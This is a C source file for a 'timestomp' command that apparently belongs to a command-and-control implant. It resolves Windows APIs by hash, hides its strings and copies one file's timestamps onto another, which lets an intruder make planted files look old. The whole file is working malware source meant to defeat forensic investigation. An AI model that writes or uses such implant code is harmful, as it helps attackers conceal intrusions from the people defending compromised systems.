#include "config.h"
#ifdef INCLUDE_CMD_TIMESTOMP

#include "commands.h"
#include "json_out.h"

typedef DWORD (WINAPI *fn_GetFileAttributesExA_t)(LPCSTR, DWORD, void*);
typedef BOOL  (WINAPI *fn_SetFileAttributesA_t)(LPCSTR, DWORD);
typedef HANDLE (WINAPI *fn_CreateFileA_t2)(LPCSTR, DWORD, DWORD, void*, DWORD, DWORD, HANDLE);
typedef BOOL  (WINAPI *fn_SetFileTime_t)(HANDLE, const void*, const void*, const void*);

// WFAD offsets same as cmd_stat
#define WFAD_ATTRS  0
#define WFAD_CTIME  4
#define WFAD_ATIME  12
#define WFAD_WTIME  20
#define WFAD_SIZEHI 28
#define WFAD_SIZELO 32

VOID cmd_timestomp(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD src_len = 0, dst_len = 0;
    char* src = parser_string(args, &src_len);
    char* dst = parser_string(args, &dst_len);
    if (!src || src_len == 0 || !dst || dst_len == 0) {
        package_add_string(inst, response, XSTR("Usage: timestomp <source_file> <dest_file>"));
        response->is_error = TRUE;
        return;
    }

    xstr(_k32, "kernel32.dll");
    HMODULE h_k32 = inst->Win32.LoadLibraryA(_k32);
    fn_GetFileAttributesExA_t pGet = h_k32 ?
        (fn_GetFileAttributesExA_t)resolve_function(h_k32, hash_string_djb2(XSTR("GetFileAttributesExA"))) : NULL;
    fn_CreateFileA_t2 pCreate = h_k32 ?
        (fn_CreateFileA_t2)(void*)inst->Win32.CreateFileA : NULL;
    fn_SetFileTime_t pSetTime = h_k32 ?
        (fn_SetFileTime_t)resolve_function(h_k32, hash_string_djb2(XSTR("SetFileTime"))) : NULL;
    if (!pGet || !pCreate || !pSetTime) {
        package_add_string(inst, response, XSTR("resolve failed"));
        response->is_error = TRUE;
        return;
    }

    // read source timestamps
    BYTE wfad[36];
    if (!pGet(src, 0, wfad)) {
        package_add_string(inst, response, XSTR("Source file not found"));
        response->is_error = TRUE;
        return;
    }

    // open destination with write attributes access
    HANDLE h = pCreate(dst, 0x0200 /*FILE_WRITE_ATTRIBUTES*/, 0, NULL,
                        3 /*OPEN_EXISTING*/, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        package_add_string(inst, response, XSTR("Cannot open destination"));
        response->is_error = TRUE;
        return;
    }

    BOOL ok = pSetTime(h,
        wfad + WFAD_CTIME,   // creation
        wfad + WFAD_ATIME,   // accessed
        wfad + WFAD_WTIME);  // modified
    gate_CloseHandle(inst, h);

    JSON_BUF jb;
    j_init(&jb);
    if (ok) {
        j_append_raw(&jb, "{\"result\":\"ok\",\"source\":");
        j_append_str(&jb, src);
        j_append_raw(&jb, ",\"dest\":");
        j_append_str(&jb, dst);
        j_append_raw(&jb, "}");
    } else {
        j_append_raw(&jb, "{\"result\":\"failed\"}");
    }
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
